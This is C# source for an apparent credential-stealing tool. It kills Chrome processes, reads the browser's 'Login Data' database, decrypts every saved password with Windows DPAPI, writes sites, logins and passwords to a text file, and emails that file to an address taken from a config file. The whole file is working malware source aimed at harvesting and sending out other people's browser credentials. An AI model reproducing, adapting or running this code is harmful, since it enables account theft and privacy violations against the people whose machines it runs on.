using System;
using System.Text;
using System.Runtime.InteropServices;
using System.ComponentModel;
using System.IO;
using System.Data;
using System.Data.SQLite;
using System.Diagnostics;

using Newtonsoft.Json.Linq;

namespace dpapiPass
{
    public class ChromePasswordDecrypt
    {
        public const string PATH = "output.txt";
        public const string CONFIG = "config.json";
        public const string HOST = "host";
        public const string EMAIL_FROM = "email_from";
        public const string PASSWORD = "password";
        public const string EMAIL_TO = "email_to";
        public const string HELP = "help";
        
        static JObject objConfig;
        public static void killChromeProcess()
        {
            Process[] ps1 = System.Diagnostics.Process.GetProcessesByName("chrome");
            foreach (Process p1 in ps1)
                p1.Kill();
        }

        public static void onCreateFile()
        {
            if (!File.Exists(PATH))
            {
                var _output = File.Create(PATH);
                _output.Close();
            }
        }

        public static void writePassToFile(int rows, DataTable db)
        {
            byte[] entropy = null;
            string description;
            StreamWriter sw = new StreamWriter(PATH, false, Encoding.UTF8);
            for (int i = 0; i < rows; i++)
            {
                string url = db.Rows[i][1].ToString();
                string login = db.Rows[i][3].ToString();
                byte[] byteArray = (byte[])db.Rows[i][5];
                byte[] decrypted = DPAPI.Decrypt(byteArray, entropy, out description);
                string password = new UTF8Encoding(true).GetString(decrypted);
                sw.WriteLine("----------------------------");
                sw.WriteLine($"Номер: {i}");
                sw.WriteLine($"Сайт: {url}");
                sw.WriteLine($"Логин: {login}");
                sw.WriteLine($"Пароль: {password}");
            }
            sw.Close();
        }

        public static void runParametrs(string[] args)
        {
            foreach(string s in args)
            {
                if (onConfig(s))
                {
                    Console.WriteLine("Config is not set! Try help.");
                    return;
                }
                if (s == CONFIG)
                {
                    configParse();
                }
                if (s == HELP)
                {
                    Console.WriteLine("Example: *.exe config.json");
                }
            }
        }

        public static bool onConfig(string s)
        {
            return s != CONFIG || s != HELP;
        }
        public static void configParse()
        {
            string dataConfig = File.ReadAllText(CONFIG);
            objConfig = JObject.Parse(dataConfig);
        }
        public static void decryptPass()
        {
            string fileDb = @"C:\Users\" + Environment.UserName + @"\AppData\Local\Google\Chrome\User Data\Default\Login Data";
            string connectionString = $"Data Source = {fileDb}";
            string db_fields = "logins";
            DataTable db = new DataTable();
            string sql = $"SELECT * FROM {db_fields}";
            using (SQLiteConnection connection = new SQLiteConnection(connectionString))
            {
                SQLiteCommand command = new SQLiteCommand(sql, connection);
                SQLiteDataAdapter adapter = new SQLiteDataAdapter(command);
                adapter.Fill(db);
            }
            int rows = db.Rows.Count;
            writePassToFile(rows, db);
        }
        static void Main(string[] args)
        {
            runParametrs(args);
            killChromeProcess();
            onCreateFile();
            decryptPass();
            PassEmailSender mail = new PassEmailSender();
            mail.sendMail((string)objConfig[HOST], (string)objConfig[EMAIL_FROM], (string)objConfig[PASSWORD], (string)objConfig[EMAIL_TO], "Passwords", "This is attach with passwords...", PATH);
        }
        
    }
}

